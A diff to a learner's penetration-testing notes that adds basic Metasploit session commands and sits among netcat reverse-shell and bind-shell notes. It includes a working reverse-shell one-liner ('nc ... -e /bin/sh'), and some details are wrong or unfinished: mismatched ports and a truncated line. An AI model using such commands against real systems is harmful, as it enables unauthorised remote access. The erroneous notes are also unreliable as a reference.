@@ -159,6 +159,14 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 ## Exploitation
 
+- **Metasploit COmmands**
+- `msfconsole`
+- `getuid` if yout type this after establishing a session then you will be able to se whether what level of access we were able to obtain. if its **NT AUthorization** then its the highest level
+- `sysinfo` This will tell us about the system that we have hacked into
+
+- There are a bunch of commands that we can run with metasploit like after typing gaining access with metasploit I can type 'help" and under the networking section there will be commands that you can run. 
+
+
 - Netcat - This opens a listening port on our attack box machine `nc <ip address> port` this will establishing a listening port to check if the victim connects with the attack machine
 - Reverse shell is when a victim tries to connect with the attack machine - used 95% of the time
 - Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
@@ -167,6 +175,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 **Reverse Shell**
 -`nc -nvlp 444` attack box (lvp means listening verbose port)
 -`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
+- Whenever a victim connects back to 
 
 **Bin shell**
 - You send an exploit to the victim's machine and then open a port there. Next you connect to it via your attacking VM once the port is established. All of this is done using Netcat
